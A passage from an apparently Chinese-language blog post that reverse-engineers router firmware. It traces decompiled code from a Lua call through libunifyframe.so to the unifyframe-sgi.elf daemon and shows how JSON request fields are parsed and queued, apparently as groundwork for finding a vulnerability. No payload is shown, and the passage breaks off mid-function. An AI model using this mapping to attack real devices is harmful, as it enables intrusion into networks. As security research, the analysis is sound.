<p><code>sub_A00</code> 函数定义如下，可以看到最后是调用了 <code>uf_client_call</code> 函数，而在这之前的很多赋值操作如 <code>*(_DWORD *)(v3 + 12) = lua_tolstring(a1, 4, 0);</code> ，很容易能猜测到其实是在解析 <code>Lua</code> 传入的各个参数字段。在 <code>Lua</code> 的代码中 <code>uf_call.client_call(ctype, cmd, module, param, back, ip, password, force, not_change_configId, multi)</code> 这里传入了多个参数，但是 <code>sub_A00</code> 函数就一个参数 <code>a1</code> ，结合的操作分析出这里是在解析参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_A00</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">52</span>);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="number">52</span>);</span><br><span class="line">    v5 = <span class="number">4</span>;</span><br><span class="line">    *(_DWORD *)v3 = luaL_checkinteger(a1, <span class="number">1</span>);</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">4</span>) = luaL_checklstring(a1, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    v6 = luaL_checklstring(a1, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">    v7 = *(_DWORD *)v3;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">8</span>) = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v3 + <span class="number">12</span>) = lua_tolstring(a1, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">41</span>) = lua_toboolean(a1, <span class="number">5</span>) == <span class="number">1</span>;</span><br><span class="line">      v5 = <span class="number">6</span>;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">20</span>) = lua_tolstring(a1, v5, <span class="number">0</span>);</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">24</span>) = lua_tolstring(a1, v5 + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    v8 = v5 + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)v3 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = v5 + <span class="number">3</span>;</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">43</span>) = lua_toboolean(a1, v5 + <span class="number">2</span>) == <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">43</span>) = lua_toboolean(a1, v5 + <span class="number">2</span>) == <span class="number">1</span>;</span><br><span class="line">      v8 = v5 + <span class="number">4</span>;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">44</span>) = lua_toboolean(a1, v5 + <span class="number">3</span>) == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(v3 + <span class="number">48</span>) = lua_toboolean(a1, v8) == <span class="number">1</span>;</span><br><span class="line">    v4 = uf_client_call(v3, v13, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">......    </span><br></pre></td></tr></table></figure>

<p><code>uf_client_call</code> 函数是一个引用外部库的函数，用 <code>grep</code> 在整个文件系统搜索字符串 <code>uf_client_call</code> ，结合 <code>/usr/lib/lua/libuflua.so</code> 文件中引用的外部库进行分析，最终判断出 <code>uf_client_call</code> 函数定义在 <code>/usr/lib/libunifyframe.so</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513373.png" alt="image-20230822132450393"></p>
<p>用 <code> IDA</code> 对 <code>/usr/lib/libunifyframe.so</code> 文件进行分析，看到 <code>uf_client_call</code> 函数首先判断了 <code>method</code> 的类型，然后解析出报文中各字段的值，并将其键值对添加到一个 <code>JSON</code> 对象中，接着将最终处理好的 <code>JSON</code> 对象转换为 <code>JSON</code> 格式的字符串，通过 <code>uf_socket_msg_write</code> 用 <code>socket</code> 套接字进行数据传输</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">uf_client_call</span><span class="params">(_DWORD *a1, <span class="type">int</span> a2, <span class="type">int</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  v5 = json_object_new_object();</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">switch</span> ( *a1 )<span class="comment">//这里的*a1指的就是uf_call.client_call函数的第一个参数ctype,他取决于method它在dev_sta.lua文件中被赋值为了2</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      v15 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">10</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;acConfig.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      v14 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">11</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;devConfig.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      v8 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">8</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;devSta.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      v16 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">8</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;devCap.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      v17 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">7</span>;</span><br><span class="line">......</span><br><span class="line">LABEL_22:<span class="comment">//接下来使用了大量的json_object_object_add函数，该函数的作用是在已有的JSON对象中添加一个键值对，以json_object_object_add(v20, &quot;remoteIp&quot;, v23)函数为例，作用是将&#123;&quot;remote&quot;,v23&#125;这个键值对添加到v20所指的JSON对象中，</span></span><br><span class="line">      json_object_object_add(v5, <span class="string">&quot;method&quot;</span>, v19);</span><br><span class="line">      v20 = json_object_new_object();</span><br><span class="line">......</span><br><span class="line">      v21 = json_object_new_string(a1[<span class="number">2</span>]);</span><br><span class="line">      json_object_object_add(v20, <span class="string">&quot;module&quot;</span>, v21);</span><br><span class="line">      v22 = a1[<span class="number">5</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">      json_object_object_add(v20, <span class="string">&quot;remoteIp&quot;</span>, v23);</span><br><span class="line">LABEL_35:</span><br><span class="line">      v25 = a1[<span class="number">6</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v25 )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = json_object_new_string(v25);</span><br><span class="line">......</span><br><span class="line">        json_object_object_add(v20, <span class="string">&quot;remotePwd&quot;</span>, v26);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( a1[<span class="number">9</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">......</span><br><span class="line">        json_object_object_add(v20, <span class="string">&quot;buf&quot;</span>, v27);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *a1 != <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = *((<span class="type">unsigned</span> __int8 *)a1 + <span class="number">45</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">42</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v30 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v30 )</span><br><span class="line">          &#123;</span><br><span class="line">            v31 = v20;</span><br><span class="line">            v32 = <span class="string">&quot;execute&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">43</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v29 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v29 )</span><br><span class="line">            json_object_object_add(v20, <span class="string">&quot;force&quot;</span>, v29);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">44</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v30 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v30 )</span><br><span class="line">          &#123;</span><br><span class="line">            v31 = v20;</span><br><span class="line">            v32 = <span class="string">&quot;configId_not_change&quot;</span>;</span><br><span class="line">LABEL_56:</span><br><span class="line">            json_object_object_add(v31, v32, v30);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_57:</span><br><span class="line">      v28 = *((<span class="type">unsigned</span> __int8 *)a1 + <span class="number">45</span>);</span><br><span class="line">LABEL_58:</span><br><span class="line">      <span class="keyword">if</span> ( v28 )</span><br><span class="line">      &#123;</span><br><span class="line">        v33 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v33 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;from_url&quot;</span>, v33);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">47</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v34 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v34 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;from_file&quot;</span>, v34);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">48</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v35 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v35 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;multi&quot;</span>, v35);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">46</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v36 = json_object_new_boolean(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v36 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;not_commit&quot;</span>, v36);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)a1 + <span class="number">40</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v37 = json_object_new_boolean(*((<span class="type">unsigned</span> __int8 *)a1 + <span class="number">41</span>) ^ <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v37 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;async&quot;</span>, v37);</span><br><span class="line">      &#125;</span><br><span class="line">      v38 = (_BYTE *)a1[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !v38 || !*v38 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_78;</span><br><span class="line">      v39 = json_object_new_string(v38);</span><br><span class="line">      json_object_object_add(v20, <span class="string">&quot;data&quot;</span>, v39);</span><br><span class="line">LABEL_78:</span><br><span class="line">      v41 = (_BYTE *)a1[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v41 &amp;&amp; *v41 )</span><br><span class="line">      &#123;</span><br><span class="line">        v42 = json_object_new_string(v41);</span><br><span class="line">        <span class="keyword">if</span> ( !v42 )</span><br><span class="line">        &#123;</span><br><span class="line">          json_object_put(v20);</span><br><span class="line">          json_object_put(v5);</span><br><span class="line">          v40 = <span class="number">630</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">        &#125;</span><br><span class="line">        json_object_object_add(v20, <span class="string">&quot;device&quot;</span>, v42);</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(v5, <span class="string">&quot;params&quot;</span>, v20);<span class="comment">//将上面的v20当做了params的值，向v5中添加新的键值对</span></span><br><span class="line">      v43 = json_object_to_json_string(v5);<span class="comment">//json_object_to_json_string作用是将JSON对象转换为JSON格式的字符串</span></span><br><span class="line">......</span><br><span class="line">      v44 = uf_socket_client_init(<span class="number">0</span>);</span><br><span class="line">......</span><br><span class="line">      v50 = <span class="built_in">strlen</span>(v43);</span><br><span class="line">      uf_socket_msg_write(v44, v43, v50);<span class="comment">//最终调用uf_socket_msg_write，用socket实现了进程间通信，将解析好的json数据发送给其他进程进行处理</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>既然存在 <code>uf_socket_msg_write</code> 进行数据发送，那么肯定就在一个地方在用 <code>uf_socket_msg_read</code> 函数进行数据的接收，用 <code>grep</code> 进行字符串搜索，发现 <code>/usr/sbin/unifyframe-sgi.elf</code> 文件，并且该文件还位于 <code>/etc/init.d</code> 目录下，这意味着该进程最初就会启动并一直存在，所以判断出这个 <code>unifyframe-sgi.elf</code> 文件就是用来接收 <code>libunifyframe.so</code> 文件所发送过来的数据</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513060.png" alt="image-20230822145039327"></p>
<h2 id="二进制文件分析"><a href="#二进制文件分析" class="headerlink" title="二进制文件分析"></a>二进制文件分析</h2><p>为了总结 <code>/usr/sbin/unifyframe-sgi.elf</code> 文件中调用链，同时梳理清几个线程和信号量的关系，我画了整体的调用流程图，接下来会分析下图所示的所有函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308311122302.png" alt="image-20230831112201027"></p>
<h3 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h3><p>从 <code>/usr/sbin/unifyframe-sgi.elf</code> 文件中 <code>main</code> 函数里的 <code>uf_socket_msg_read</code> 函数开始分析（这里是该文件接收数据的最初位置，从这里开始追踪数据会比较明朗，如果单纯的从 <code>main</code> 函数逐行分析，思维会很乱）。<code>uf_socket_msg_read(*v29, v31 + 1)</code> 该函数的第一个参数是文件描述符，第二个参数是接收数据存储的位置（具体定义可以查看 <code>/usr/lib/libunifyframe.so</code> 文件）</p>
<p>下面两张图片为调试 <code>uf_socket_msg_read</code> 函数执行前后的状态</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291338524.png" alt="image-20230829133810198"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291342074.png" alt="image-20230829134227731"></p>
<p>有趣的地方在于很多字段我们没有设置，但上图能看到这些字段依然存在（只不过值是空的字符串），这意味着在数据传输过来之前有地方设置了这些字段</p>
<p>之后 <strong>解析字段</strong>、<strong>执行具体操作</strong> 的两个函数分别为 <code>parse_content</code> <code>add_pkg_cmd2_task</code> （均位于 <code>main</code> 函数），如下图</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291344320.png" alt="image-20230829134431234"></p>
<h3 id="解析数据"><a href="#解析数据" class="headerlink" title="解析数据"></a>解析数据</h3><p>下图为调试到 <code>parse_content</code> 函数执行前的状态，发现参数是一个结构体地址，其存储了一些地址和数据。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291349507.png" alt="image-20230829134935230"></p>
<p>下面对 <code>parse_content</code> 函数进行分析（具体分析已标在注释中）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">parse_content</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  v3 = *(_DWORD *)(a1 + <span class="number">4</span>);</span><br><span class="line">  v4 = <span class="number">598</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  v5 = json_tokener_parse(v3, a2);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v5, <span class="string">&quot;params&quot;</span>, &amp;v20) != <span class="number">1</span> )<span class="comment">//检查了params字段是否存在值，不存在的话直接返回-1</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v20, <span class="string">&quot;device&quot;</span>, &amp;v19) == <span class="number">1</span> &amp;&amp; json_object_get_type(v19) == <span class="number">6</span> )<span class="comment">//检查了是否存在device字段是否存在值以及类型是否为string  这里的判断失败也不会返回-1，意味着这个字段是非必须的</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="type">const</span> <span class="type">char</span> *)json_object_get_string(v19);</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v6, <span class="string">&quot;method&quot;</span>, &amp;v21) != <span class="number">1</span> )<span class="comment">//method字段也必须要存在</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_31:</span><br><span class="line">    json_object_put(v6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = json_object_get_string(v21);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v9, <span class="string">&quot;cmdArr&quot;</span>) )<span class="comment">//method的值不为cmdArr的话，进入else</span></span><br><span class="line">  &#123;</span><br><span class="line">......   </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">    v17 = parse_obj2_cmd(v6, v8);<span class="comment">//进行数据解析的具体位置,v6为json对象</span></span><br><span class="line">    *v16 = v17;</span><br><span class="line">    <span class="keyword">if</span> ( !v17 )</span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">    pkg_add_cmd(a1, v16);</span><br><span class="line">    v16[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  json_object_put(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>根据上面的分析可知，具体进行数据解析的位置应该是 <code>parse_obj2_cmd</code> 函数，该函数具体分析如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">parse_obj2_cmd</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">52</span>);<span class="comment">//创建了一个堆块，用于记录和存储接下来的各种信息，该函数最终会返回这个堆块地址</span></span><br><span class="line">  v5 = v3;</span><br><span class="line">......</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="number">52</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">    *(_DWORD *)(v5 + <span class="number">16</span>) = strdup(a2);</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(a1, <span class="string">&quot;module&quot;</span>, &amp;v46) != <span class="number">1</span></span><br><span class="line">    || (v6 = json_object_get_string(v46), (v7 = v6) == <span class="number">0</span>)</span><br><span class="line">    || <span class="built_in">strcmp</span>(v6, <span class="string">&quot;esw&quot;</span>) )<span class="comment">//检查module字段是否存在，存在的话值是否为字符串esw，如果这两个条件有一个不满足，则进入if</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( json_object_object_get_ex(a1, <span class="string">&quot;method&quot;</span>, &amp;v46) != <span class="number">1</span> )<span class="comment">//解析method字段</span></span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">    v16 = json_object_get_string(v46);<span class="comment">//获取到method的值，下面去匹配对应的操作，各种操作都对应一个数字，该数字放在了堆块的第一个指针处</span></span><br><span class="line">    v17 = v16;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v16, <span class="string">&quot;devSta&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v17, <span class="string">&quot;acConfig&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v17, <span class="string">&quot;devConfig&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)v5 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v17, <span class="string">&quot;devCap&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v18 = <span class="number">3</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v17, <span class="string">&quot;ufSys&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">...... </span><br><span class="line">        &#125;</span><br><span class="line">        v18 = <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)v5 = v18;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">  &#125;</span><br><span class="line">......<span class="comment">//此处省略了大部分代码，做的事情依然是字段解析，然后写入内存，就不逐一分析了</span></span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v47, <span class="string">&quot;data&quot;</span>, &amp;v46) == <span class="number">1</span> &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(v46) - <span class="number">4</span>) &lt; <span class="number">3</span> )<span class="comment">//判断params字段中是否存在data，如果存在的话将其赋值给v37，并且检查了data的值类型，只能为object,array,string三种类型，然后将data的值放到堆块的第四个指针处  注意：报文中我并没有设置data字段，但是接收的数据在写入内存之前就被自动添加了data字段</span></span><br><span class="line">  &#123;</span><br><span class="line">    v43 = json_object_get_string(v46);</span><br><span class="line">    <span class="keyword">if</span> ( v43 )</span><br><span class="line">    &#123;</span><br><span class="line">      v44 = strdup(v43);</span><br><span class="line">      *(_DWORD *)(v5 + <span class="number">12</span>) = v44;</span><br><span class="line">      <span class="keyword">if</span> ( !v44 )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="number">561</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_136;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v42;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解析后各字段的值如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291430860.png" alt="image-20230829143032518"></p>
<p><code>parse_obj2_cmd</code> 函数结束后，会执行 <code>pkg_add_cmd(a1, v16)</code> ，它的核心作用就是在 <code>a1</code> 这个数据结构中记录了 <code>v16</code> 的指针，使得后续操作通过 <code>a1</code> 访问到刚刚解析出来的各个字段。不过这 <code>pkg_add_cmd</code> 函数里有一个谜之操作，在这行代码中 <code>*(_DWORD *)(a1 + 92) = a2 + 13</code> 是把 <code>a2</code> 也就是 <code>v16</code> 的值加上了 <code>13</code> 存储到了 <code>a1</code> 中，而通过后续的分析得知，之后访问这个 <code>v16</code> 的堆块是通过 <code>*(a1+92)-13</code> 得到的地址。存的时候 <code>+13</code> ，访问的时候 <code>-13</code> ，这里没太理解但并不影响我们后续的分析</p>
<h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><h4 id="操作关键信号量"><a href="#操作关键信号量" class="headerlink" title="操作关键信号量"></a>操作关键信号量</h4><p>解析完成后，直接看 <code>add_pkg_cmd2_task</code> 函数的调试界面，发现参数传入的还是执行 <code>parse_content</code> 函数那个结构体地址</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291436977.png" alt="image-20230829143659670"></p>
<p>对 <code>add_pkg_cmd2_task</code> 函数进行分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">add_pkg_cmd2_task</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( dword_435ECC &lt; <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pthread_mutex_lock(*a1 + <span class="number">20</span>);</span><br><span class="line">    v3 = (_DWORD *)a1[<span class="number">22</span>];</span><br><span class="line">    v4 = v3 - <span class="number">13</span>;<span class="comment">//当时存地址时加了13，这里又减了13，所以v4就是上面记录了解析json各字段的那个堆块地址</span></span><br><span class="line">    <span class="keyword">for</span> ( i = *v3 - <span class="number">52</span>; ; i = *(_DWORD *)(i + <span class="number">52</span>) - <span class="number">52</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 + <span class="number">13</span> == a1 + <span class="number">22</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        pthread_mutex_unlock(*a1 + <span class="number">20</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v6 = <span class="built_in">malloc</span>(<span class="number">20</span>);</span><br><span class="line">      v7 = (<span class="type">int</span> *)v6;</span><br><span class="line">......</span><br><span class="line">      v10 = v6 + <span class="number">4</span>;</span><br><span class="line">      v7[<span class="number">2</span>] = v10;</span><br><span class="line">      v7[<span class="number">1</span>] = v10;</span><br><span class="line">      *v7 = (<span class="type">int</span>)v4;</span><br><span class="line">      v7[<span class="number">4</span>] = (<span class="type">int</span>)(v7 + <span class="number">3</span>);</span><br><span class="line">      v7[<span class="number">3</span>] = (<span class="type">int</span>)(v7 + <span class="number">3</span>);</span><br><span class="line">......</span><br><span class="line">      *v7 = (<span class="type">int</span>)v4;</span><br><span class="line">      v11 = (_DWORD *)*v4;</span><br><span class="line">      v12 = *(_DWORD *)*v4;</span><br><span class="line">      <span class="keyword">if</span> ( v12 == <span class="number">3</span> )<span class="comment">//这里判断v12就是前面解析method的值，因为发送的是merge（实际传入的就是devSta.set） 所以v12最终在前面被解析成了2</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v12 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        gettimeofday(v4 + <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">        uf_sys_handle(*(_DWORD **)*v7, v4 + <span class="number">1</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">        gettimeofday(v4 + <span class="number">7</span>, <span class="number">0</span>);</span><br><span class="line">        sub_40B644(v7);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v12 == <span class="number">2</span> &amp;&amp; !<span class="built_in">strcmp</span>(v11[<span class="number">1</span>], <span class="string">&quot;get&quot;</span>) &amp;&amp; !v11[<span class="number">9</span>] &amp;&amp; uf_cmd_buf_exist_check(v11[<span class="number">2</span>], <span class="number">2</span>, v11[<span class="number">3</span>], v4 + <span class="number">1</span>) )<span class="comment">//虽然v12为2了，但我们的字符串是set，并不是get，所以这个if还是进不去</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)(*v7 + <span class="number">44</span>) = <span class="number">1</span>;</span><br><span class="line">        sub_40B644(v7);</span><br><span class="line">        v8 = *v7;</span><br><span class="line">        v9 = <span class="number">2</span>;</span><br><span class="line">        